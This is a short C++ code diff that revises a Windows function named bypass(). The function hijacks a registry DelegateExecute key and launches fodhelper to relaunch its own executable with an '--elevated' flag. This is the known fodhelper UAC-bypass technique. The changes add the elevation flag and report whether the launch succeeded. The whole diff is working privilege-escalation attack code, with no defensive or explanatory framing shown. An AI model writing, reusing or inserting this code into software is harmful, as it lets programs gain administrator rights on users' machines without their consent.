@@ -24,8 +24,7 @@ namespace core {
     std::wstring BuildCmd() {
         wchar_t exePath[MAX_PATH];
         GetModuleFileNameW(nullptr, exePath, MAX_PATH);
-        std::wstring fullPath(exePath);
-        return fullPath;
+        return std::wstring(exePath) + L" --elevated";
     }
 
     bool createRegKey(const wchar_t *key, const wchar_t *value) {
@@ -52,11 +51,14 @@ namespace core {
         return true;
     }
 
-    void bypass() {
+    bool bypass() {
         std::wstring cmd = BuildCmd();
-
         createRegKey(DELEGATE_EXEC_REG_KEY.c_str(), L"");
         createRegKey(nullptr, cmd.c_str());
-        ShellExecuteW(nullptr, L"open", FODHELPER.c_str(), nullptr, nullptr, SW_SHOW);
+        if (ShellExecuteW(nullptr, L"open", FODHELPER.c_str(), nullptr, nullptr, SW_SHOW)) {
+            return true;
+        }else {
+            return false;
+        }
     }
 }
